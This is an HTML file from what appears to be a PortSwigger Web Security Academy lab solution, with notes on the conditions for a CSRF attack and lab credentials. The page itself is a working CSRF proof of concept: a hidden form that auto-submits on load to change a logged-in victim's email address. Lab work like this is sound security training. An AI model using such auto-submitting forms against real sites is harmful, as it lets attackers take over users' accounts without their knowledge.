<!-- Lab #1 - CSRF vulnerability with no defenses

Vulnerable parameter - email change functionality

Goal - exploit the CSRF vulnerability and change the email address

creds - wiener:peter

Analysis:

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - satisfied 

to open a python server on windows use: python -m http.server <portNo.>
    more on: https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server

-->



<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <!-- try using get method if post does not work -->
        <form action="https://0af9001d032d7a20c1e667bb009000cb.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5w@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>